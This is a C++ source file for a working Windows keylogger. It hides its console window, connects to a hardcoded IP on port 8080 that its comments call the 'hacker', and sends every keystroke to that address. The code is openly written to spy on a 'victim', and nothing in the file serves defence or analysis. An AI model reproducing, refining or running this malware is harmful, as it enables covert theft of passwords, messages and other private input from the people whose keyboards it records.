#define UNICODE
#include <iostream>
#include <winsock2.h>
#include <string>
#include <fstream>
#include <map>
#include <sstream> // Sử dụng để gom dữ liệu trước khi gửi
using namespace std;

WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;
struct sockaddr_in clientService;
int result;
stringstream outputStream; // Gom các dữ liệu trước khi gửi

const map<int, string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"},
};
//check if the input is a special key
bool SpecialKeys(int S_Key) {
    if (keyname.find(S_Key) != keyname.end()) {
        string outputString = keyname.at(S_Key);
        outputStream << outputString;
        cout << outputString;
        return true;
    }
    return false;
}
// from victim to hacker, stop if meet [END] key or error while sending
bool sendData() {
    string message = outputStream.str();
    if (!message.empty()) {
        result = send(ConnectSocket, message.c_str(), (int)message.size(), 0);
        if (result == SOCKET_ERROR) {
            cerr << endl << "Error in sending data: " << WSAGetLastError() << endl;
            return false;
        }
        if(message.compare("[END]")==0)
        {
             cerr << endl << "[END] input is detected" << endl;
            return false;
        }
        outputStream.str("");  // Xóa nội dung đã gửi
        outputStream.clear();
    }
    return true;
}
// Execute keyloggger until connection is terminated
void runKeylogger() {
    cerr << "Begin running keylogger" <<endl;
    unsigned char KEY;
    while (true) {
        Sleep(10);
        for (KEY = 8; KEY <= 190; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                if (!SpecialKeys(KEY)) {
                    string outputString(1, char(KEY));
                    outputStream << outputString;
                    cout << outputString;
                }
                // sending data
                if(!sendData())
                return;
            }
        }
    }
}
// Create connection between hacker and this 'victim'
bool initiateConnection(const string &hackerAddr) {
    cerr << "Initiating Connection to "<< hackerAddr <<" ..." <<endl;
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        cerr << "WSAStartup failed with error: " << result << endl;
        return false;
    }

    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return false;
    }

    clientService.sin_family = AF_INET;
    clientService.sin_port = htons(8080);
    clientService.sin_addr.s_addr = inet_addr(hackerAddr.c_str());

    if (clientService.sin_addr.s_addr == INADDR_NONE) {
        cerr << "Invalid IP Address" << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    result = connect(ConnectSocket, (SOCKADDR *)&clientService, sizeof(clientService));
    if (result == SOCKET_ERROR) {
        cerr << "Connect failed with error: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    string initMessage = "listening target: ";
    result = send(ConnectSocket, initMessage.c_str(), (int)initMessage.size(), 0);
    if (result == SOCKET_ERROR) {
        cerr << "Error in sending data: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return false;
    }

    return true;
}
// 'true' for turning on stealth or 'false' for otherwise
void Stealth(bool stealth) {
    if (!stealth) {
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // Visible window
        cerr << "Stealth is offline." <<endl;
    } else {
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // Invisible window
        FreeConsole();
    }
}

int main() {
    Stealth(1);  // 1 for invisible, 0 for visible

    if (!initiateConnection("192.168.227.132")) {
        return 0;
    }
    runKeylogger();
    cerr<< endl << "Ending keylogger program" << endl;
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
